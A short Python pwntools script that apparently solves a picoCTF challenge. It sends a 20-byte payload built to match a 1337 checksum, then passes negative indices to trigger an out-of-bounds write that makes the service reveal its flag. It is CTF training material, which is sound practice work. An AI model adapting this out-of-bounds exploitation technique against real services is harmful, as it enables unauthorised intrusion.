from pwn import *

host = 'saturn.picoctf.net'
port = 52542

def payload_assembly():
	payload = p8(0x66)

	for i in range(19):
		payload += p8(0x41)

	return payload

def calculate_checksum(content, length):
	checksum = 0

	for i in range(length):
		checksum += content[i]

	return checksum

r = remote(host, port)

hard2easy_offs = '-314'
idx2checker = '-16'
payload = payload_assembly()
checksum = 1337

print(f'[i] Payload length : {len(payload)}')

if (calculate_checksum(payload, len(payload)) != checksum):
	print('[-] Invalid checksum')
	exit(1)

print('[+] Propertly checksum')

r.recvuntil(b'>> ')
r.sendline(payload)

payload = (idx2checker + ' ' + hard2easy_offs).encode()

r.recvuntil(b'10.\n')
r.sendline(payload)

r.recvuntil(b'Here\'s the flag.\n')
flag = r.recv(100).decode().strip()

print(f'[+] Flag : {flag}')

r.close()
